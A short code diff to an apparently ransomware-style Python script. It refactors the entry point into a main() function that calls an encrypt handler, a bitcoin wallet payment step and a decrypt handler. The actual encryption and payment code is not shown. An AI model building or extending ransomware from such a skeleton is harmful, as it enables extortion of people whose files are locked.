@@ -31,10 +31,17 @@ def decrypt_button_handler():
     start_decryption()
     logger.info("DECRYPTION DONE")
 
+
 def get_payment_details():
     get_bitcoin_wallet_address()
 
-if __name__ == "__main__":
+
+def main():
     encrypt_button_handler()
     get_payment_details()
     decrypt_button_handler()
+
+
+if __name__ == "__main__":
+    main()
+    
